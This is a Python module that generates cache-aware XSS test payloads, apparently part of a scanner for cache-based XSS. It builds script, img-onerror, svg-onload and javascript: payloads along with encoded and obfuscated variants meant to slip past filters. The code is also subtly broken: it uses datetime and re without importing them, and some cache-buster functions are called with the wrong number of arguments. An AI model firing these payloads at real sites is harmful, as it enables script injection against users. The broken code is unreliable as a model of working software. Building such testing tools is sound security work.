"""
XSS Payload Generator Module

This module generates cache-aware XSS payloads with various encoding and
obfuscation techniques for testing cache-based vulnerabilities.
"""

import logging
from typing import Dict, List, Optional, Set, Tuple
import random
import string
import base64
import html
import json
import hashlib
import time
from urllib.parse import quote, unquote

class XSSPayloadGenerator:
    """
    A class to generate cache-aware XSS payloads.
    """
    
    def __init__(self, config):
        """
        Initialize the XSS Payload Generator.
        
        Args:
            config (dict): Configuration settings for payload generation.
        """
        self.logger = logging.getLogger('cachexssdetector.xss_payload_generator')
        self.config = config
        
        # Generator configuration
        self.max_payload_length = config.get('max_payload_length', 2048)
        self.include_cache_busters = config.get('include_cache_busters', True)
        self.enable_polymorphic = config.get('enable_polymorphic', True)
        
        # Initialize payload templates
        self._init_templates()
        
        self.logger.info("XSS Payload Generator initialized")
    
    def _init_templates(self):
        """Initialize payload templates and patterns."""
        # Basic XSS templates
        self.basic_templates = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe onload=alert("XSS")>',
            'javascript:alert("XSS")'
        ]
        
        # Event handler templates
        self.event_handlers = {
            'load': ['onload', 'onunload'],
            'mouse': ['onclick', 'onmouseover', 'onmouseout'],
            'key': ['onkeyup', 'onkeydown', 'onkeypress'],
            'form': ['onfocus', 'onblur', 'onsubmit'],
            'media': ['onplay', 'onpause', 'onended']
        }
        
        # HTML tag templates
        self.html_tags = {
            'script': {'closing': True, 'attributes': ['src', 'type']},
            'img': {'closing': False, 'attributes': ['src', 'onerror']},
            'svg': {'closing': True, 'attributes': ['onload']},
            'iframe': {'closing': True, 'attributes': ['src', 'onload']},
            'div': {'closing': True, 'attributes': ['onclick', 'onmouseover']}
        }
        
        # Encoding patterns
        self.encoding_patterns = {
            'html': lambda x: html.escape(x),
            'url': lambda x: quote(x),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x)
        }
        
        # Cache buster patterns
        self.cache_busters = [
            {'type': 'timestamp', 'pattern': lambda: str(int(time.time()))},
            {'type': 'random', 'pattern': lambda: self._generate_random_string(8)},
            {'type': 'hash', 'pattern': lambda x: hashlib.md5(str(x).encode()).hexdigest()[:8]}
        ]
    
    def generate_payloads(
        self,
        context: Optional[Dict] = None,
        max_payloads: int = 10
    ) -> List[Dict]:
        """
        Generate XSS payloads with cache awareness.
        
        Args:
            context (dict, optional): Context information for payload generation.
            max_payloads (int): Maximum number of payloads to generate.
            
        Returns:
            list: Generated payloads.
        """
        payloads = []
        
        try:
            # Generate basic payloads
            basic_payloads = self._generate_basic_payloads(context)
            payloads.extend(basic_payloads)
            
            # Generate polymorphic variations if enabled
            if self.enable_polymorphic:
                polymorphic_payloads = self._generate_polymorphic_payloads(
                    basic_payloads
                )
                payloads.extend(polymorphic_payloads)
            
            # Add cache busters if enabled
            if self.include_cache_busters:
                cache_aware_payloads = self._add_cache_busters(payloads)
                payloads.extend(cache_aware_payloads)
            
            # Limit number of payloads
            payloads = payloads[:max_payloads]
            
            # Validate and format payloads
            payloads = [
                self._format_payload(p)
                for p in payloads
                if self._validate_payload(p)
            ]
            
        except Exception as e:
            self.logger.error(f"Error generating payloads: {str(e)}")
        
        return payloads
    
    def _generate_basic_payloads(
        self,
        context: Optional[Dict] = None
    ) -> List[Dict]:
        """
        Generate basic XSS payloads.
        
        Args:
            context (dict, optional): Context information.
            
        Returns:
            list: Basic payloads.
        """
        payloads = []
        
        try:
            # Generate from basic templates
            for template in self.basic_templates:
                payload = {
                    'content': template,
                    'type': 'basic',
                    'encoding': 'none',
                    'context': context or {},
                    'cache_buster': None
                }
                payloads.append(payload)
            
            # Generate from event handlers
            for event_type, handlers in self.event_handlers.items():
                for handler in handlers:
                    payload = {
                        'content': f'<div {handler}=alert("XSS")>',
                        'type': 'event_handler',
                        'encoding': 'none',
                        'context': {'event_type': event_type},
                        'cache_buster': None
                    }
                    payloads.append(payload)
            
            # Generate from HTML tags
            for tag, props in self.html_tags.items():
                payload = self._generate_tag_payload(tag, props)
                payloads.append(payload)
            
        except Exception as e:
            self.logger.error(f"Error generating basic payloads: {str(e)}")
        
        return payloads
    
    def _generate_polymorphic_payloads(
        self,
        base_payloads: List[Dict]
    ) -> List[Dict]:
        """
        Generate polymorphic variations of payloads.
        
        Args:
            base_payloads (list): Base payloads to modify.
            
        Returns:
            list: Polymorphic payload variations.
        """
        variations = []
        
        try:
            for payload in base_payloads:
                content = payload['content']
                
                # Generate encoded variations
                for encoding, encoder in self.encoding_patterns.items():
                    try:
                        encoded_content = encoder(content)
                        if len(encoded_content) <= self.max_payload_length:
                            variation = payload.copy()
                            variation['content'] = encoded_content
                            variation['encoding'] = encoding
                            variations.append(variation)
                    except Exception as e:
                        self.logger.debug(f"Error encoding payload: {str(e)}")
                
                # Generate obfuscated variations
                obfuscated = self._generate_obfuscated_variations(content)
                for obs_content in obfuscated:
                    if len(obs_content) <= self.max_payload_length:
                        variation = payload.copy()
                        variation['content'] = obs_content
                        variation['encoding'] = 'obfuscated'
                        variations.append(variation)
                
        except Exception as e:
            self.logger.error(f"Error generating polymorphic payloads: {str(e)}")
        
        return variations
    
    def _add_cache_busters(self, payloads: List[Dict]) -> List[Dict]:
        """
        Add cache busters to payloads.
        
        Args:
            payloads (list): Original payloads.
            
        Returns:
            list: Payloads with cache busters.
        """
        cache_aware_payloads = []
        
        try:
            for payload in payloads:
                for buster in self.cache_busters:
                    # Generate cache buster
                    buster_value = buster['pattern'](payload)
                    
                    # Add as parameter
                    param_payload = payload.copy()
                    param_payload['cache_buster'] = {
                        'type': buster['type'],
                        'value': buster_value,
                        'location': 'parameter'
                    }
                    cache_aware_payloads.append(param_payload)
                    
                    # Add as path component
                    path_payload = payload.copy()
                    path_payload['cache_buster'] = {
                        'type': buster['type'],
                        'value': buster_value,
                        'location': 'path'
                    }
                    cache_aware_payloads.append(path_payload)
                    
                    # Add as fragment
                    fragment_payload = payload.copy()
                    fragment_payload['cache_buster'] = {
                        'type': buster['type'],
                        'value': buster_value,
                        'location': 'fragment'
                    }
                    cache_aware_payloads.append(fragment_payload)
            
        except Exception as e:
            self.logger.error(f"Error adding cache busters: {str(e)}")
        
        return cache_aware_payloads
    
    def _generate_tag_payload(
        self,
        tag: str,
        properties: Dict
    ) -> Dict:
        """
        Generate payload from HTML tag template.
        
        Args:
            tag (str): HTML tag name.
            properties (dict): Tag properties.
            
        Returns:
            dict: Generated payload.
        """
        try:
            # Build attributes
            attributes = []
            for attr in properties['attributes']:
                if attr.startswith('on'):
                    attributes.append(f'{attr}=alert("XSS")')
                else:
                    attributes.append(f'{attr}=x')
            
            # Construct tag
            content = f'<{tag} {" ".join(attributes)}'
            if properties['closing']:
                content += f'></{tag}>'
            else:
                content += '>'
            
            return {
                'content': content,
                'type': 'html_tag',
                'encoding': 'none',
                'context': {'tag': tag},
                'cache_buster': None
            }
            
        except Exception as e:
            self.logger.error(f"Error generating tag payload: {str(e)}")
            return None
    
    def _generate_obfuscated_variations(self, content: str) -> List[str]:
        """
        Generate obfuscated variations of content.
        
        Args:
            content (str): Content to obfuscate.
            
        Returns:
            list: Obfuscated variations.
        """
        variations = []
        
        try:
            # String splitting
            parts = [content[i:i+2] for i in range(0, len(content), 2)]
            variations.append('+'.join(f'"{p}"' for p in parts))
            
            # Character code conversion
            char_codes = [str(ord(c)) for c in content]
            variations.append(f"String.fromCharCode({','.join(char_codes)})")
            
            # Mixed encoding
            mixed = ''
            for i, c in enumerate(content):
                if i % 2 == 0:
                    mixed += f'\\x{ord(c):02x}'
                else:
                    mixed += f'\\u{ord(c):04x}'
            variations.append(f'"{mixed}"')
            
        except Exception as e:
            self.logger.error(f"Error generating obfuscated variations: {str(e)}")
        
        return variations
    
    def _validate_payload(self, payload: Dict) -> bool:
        """
        Validate payload structure and content.
        
        Args:
            payload (dict): Payload to validate.
            
        Returns:
            bool: True if payload is valid.
        """
        try:
            # Check required fields
            if not all(k in payload for k in ['content', 'type', 'encoding']):
                return False
            
            # Check content length
            if len(payload['content']) > self.max_payload_length:
                return False
            
            # Check for balanced tags
            if payload['type'] == 'html_tag':
                if not self._check_balanced_tags(payload['content']):
                    return False
            
            return True
            
        except Exception:
            return False
    
    def _format_payload(self, payload: Dict) -> Dict:
        """
        Format and normalize payload structure.
        
        Args:
            payload (dict): Payload to format.
            
        Returns:
            dict: Formatted payload.
        """
        formatted = {
            'content': payload['content'],
            'type': payload['type'],
            'encoding': payload['encoding'],
            'length': len(payload['content']),
            'context': payload.get('context', {}),
            'cache_buster': payload.get('cache_buster'),
            'metadata': {
                'generated_at': datetime.now().isoformat(),
                'generator_version': '1.0.0'
            }
        }
        
        # Add cache buster parameters if present
        if formatted['cache_buster']:
            cb_type = formatted['cache_buster']['type']
            cb_value = formatted['cache_buster']['value']
            
            if formatted['cache_buster']['location'] == 'parameter':
                formatted['parameters'] = {f'cb_{cb_type}': cb_value}
            elif formatted['cache_buster']['location'] == 'path':
                formatted['path_suffix'] = f'/{cb_type}/{cb_value}'
            elif formatted['cache_buster']['location'] == 'fragment':
                formatted['fragment'] = f'#{cb_type}={cb_value}'
        
        return formatted
    
    def _check_balanced_tags(self, content: str) -> bool:
        """Check if HTML tags are properly balanced."""
        stack = []
        tag_pattern = re.compile(r'</?([a-zA-Z][a-zA-Z0-9]*)')
        
        for match in tag_pattern.finditer(content):
            tag = match.group(1)
            if match.group(0).startswith('</'):
                if not stack or stack.pop() != tag:
                    return False
            else:
                stack.append(tag)
        
        return len(stack) == 0
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate random string for cache busting."""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
